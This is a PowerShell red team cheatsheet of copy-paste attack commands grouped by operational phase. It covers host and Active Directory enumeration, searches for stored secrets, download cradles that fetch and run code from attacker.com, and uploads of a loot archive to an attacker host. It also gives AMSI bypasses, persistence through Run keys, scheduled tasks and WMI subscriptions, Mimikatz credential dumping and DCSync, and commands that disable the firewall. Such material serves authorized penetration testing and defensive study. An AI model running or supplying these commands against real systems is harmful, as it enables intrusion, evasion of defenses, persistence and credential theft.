# PowerShell Red Team Cheatsheet

> Copy-paste ready commands organized by operational phase.
> All commands tested on PowerShell 5.1+ and PowerShell 7+ where noted.

---

## System Enumeration

```powershell
# Identity and privilege context
whoami /all
whoami /priv
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# System information
systeminfo
hostname
[Environment]::OSVersion.Version
(Get-WmiObject Win32_OperatingSystem).Caption
Get-ComputerInfo | Select-Object CsName, OsName, OsArchitecture, WindowsVersion

# Network configuration
ipconfig /all
Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } | Select-Object InterfaceAlias, IPAddress
Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" }
Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
netstat -ano | findstr LISTENING
Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess

# Processes, services, installed software
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, Path
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName
Get-WmiObject Win32_Product | Select-Object Name, Version | Sort-Object Name
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Local users and groups
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
Get-LocalGroupMember -Group "Remote Desktop Users"
net user
net localgroup
```

## File Operations & Data Discovery

```powershell
# Search for sensitive files
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini,*.yml -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|secret|api.key|connectionstring" -List |
  Select-Object Path, LineNumber, Line

# Find recently modified files (last 7 days)
Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
  Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime, Length

# Search for credential files
Get-ChildItem -Path C:\ -Recurse -Include *.kdbx,*.key,*.pgp,*.ppk,*.p12,*.pfx,*.pem,*.crt -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Recurse -Include web.config,appsettings.json,*.rdg,*.rdp -ErrorAction SilentlyContinue

# Read alternate data streams
Get-ChildItem -Path C:\Temp -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } |
  Where-Object { $_.Stream -ne ':$DATA' }

# Download file
(New-Object Net.WebClient).DownloadFile("http://attacker.com/tool.exe","C:\Windows\Temp\tool.exe")
Invoke-WebRequest -Uri "http://attacker.com/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
Start-BitsTransfer -Source "http://attacker.com/tool.exe" -Destination "C:\Windows\Temp\tool.exe"
certutil -urlcache -split -f "http://attacker.com/tool.exe" "C:\Windows\Temp\tool.exe"

# Upload file
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\loot\data.zip"
Invoke-RestMethod -Uri "http://attacker.com/exfil" -Method POST -Body ([IO.File]::ReadAllBytes("C:\loot\data.zip"))
```

## Active Directory Enumeration

```powershell
# PowerView (dev branch) essentials
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser | Select-Object samaccountname, description, memberof, lastlogon
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname  # Kerberoastable
Get-DomainUser -UACFilter DONT_REQ_PREAUTH  # AS-REP roastable
Get-DomainGroup -AdminCount | Select-Object samaccountname
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainComputer | Select-Object dnshostname, operatingsystem
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Find-LocalAdminAccess -Verbose
Find-DomainShare -CheckShareAccess
Get-DomainTrust
Get-ForestTrust

# AD Module (native, no PowerView needed)
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties Description,LastLogonDate | Select-Object Name, Description, LastLogonDate
Get-ADGroup -Filter * | Select-Object Name, GroupScope
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
Get-ADObject -Filter {ObjectClass -eq "trustedDomain"} -Properties *
Get-ADDefaultDomainPasswordPolicy
```

## Execution & AMSI Bypass

```powershell
# AMSI bypass variants (obfuscate before use -- these signatures are burned)
# Variant 1: Reflection-based
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Variant 2: Memory patching (x64)
$a=[Ref].Assembly.GetType('System.Management.Automation.A]si]tils'.Replace(']','m'))
$b=$a.GetField('am]iI]itFailed'.Replace(']','s'),'NonPublic,Static')
$b.SetValue($null,$true)

# Variant 3: Matt Graeber's method (original concept)
# Requires custom obfuscation -- the pattern is to patch the AmsiScanBuffer function

# Download cradles (multiple methods for redundancy)
# Cradle 1: IEX + WebClient
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Cradle 2: IEX + Invoke-WebRequest
IEX (Invoke-WebRequest -Uri 'http://attacker.com/script.ps1' -UseBasicParsing).Content

# Cradle 3: .NET WebClient with custom headers
$wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent","Mozilla/5.0"); IEX $wc.DownloadString('http://attacker.com/script.ps1')

# Cradle 4: XML document
$x = New-Object Xml.XmlDocument; $x.Load('http://attacker.com/payload.xml'); IEX $x.command.execute

# Cradle 5: COM object
$c = New-Object -ComObject MsXml2.ServerXmlHttp; $c.Open('GET','http://attacker.com/script.ps1',$false); $c.Send(); IEX $c.ResponseText

# Base64 encode/decode
$cmd = "whoami /all"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded
# Decode
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))

# Reflection-based assembly loading (.NET tooling in memory)
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/tool.exe')
$assembly = [Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,[string[]]@("arg1","arg2")))
```

## Network Operations

```powershell
# Connectivity testing
Test-NetConnection -ComputerName 10.10.10.1 -Port 445
Test-NetConnection -ComputerName dc01.corp.local -Port 389 -InformationLevel Detailed

# Quick port scan
$target = "10.10.10.1"
@(21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,587,636,993,995,
  1433,1521,3306,3389,5432,5985,5986,8080,8443,8888,9389) | ForEach-Object {
    $tcp = New-Object Net.Sockets.TcpClient
    try { $tcp.Connect($target,$_); "$_ open"; $tcp.Close() } catch {}
}

# Sweep a subnet for live hosts (ICMP)
1..254 | ForEach-Object { Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue | Where-Object { $_ } | ForEach-Object { "10.10.10.$_" } }

# SMB share enumeration
net view \\targetserver
Get-SmbShare -CimSession targetserver
```

## Persistence

```powershell
# Registry Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe"
# HKLM equivalent (requires admin)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe"

# Scheduled task
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "SystemHealthCheck" -Action $action -Trigger $trigger -Principal $principal
# One-liner alternative
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# WMI event subscription
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "CoreSvcFilter"; EventNamespace = "root\cimv2";
    QueryLanguage = "WQL"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "CoreSvcConsumer"; CommandLineTemplate = "C:\Windows\Temp\payload.exe"
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

## Credential Access

```powershell
# Mimikatz via PowerShell (Invoke-Mimikatz or SafetyKatz)
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'

# Token manipulation
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "corp\admin"

# Credential vault
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }

# DPAPI - Chrome saved passwords (concept)
# Requires: SharpDPAPI, SharpChrome, or manual DPAPI blob decryption

# WiFi passwords
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profile = ($_ -split ":")[-1].Trim()
    $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    "$profile : $key"
}
```

---

## Quick Reference Table

| Task | Command |
|---|---|
| Am I admin? | `([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')` |
| Disable firewall | `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False` |
| Enable PS remoting | `Enable-PSRemoting -Force` |
| Remote PS session | `Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user` |
| List AV | `Get-MpComputerStatus` or `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct` |
| Check CLM | `$ExecutionContext.SessionState.LanguageMode` |
| Bypass CLM | Use `PowerShell -Version 2` or installutil/MSBuild unmanaged runspace |
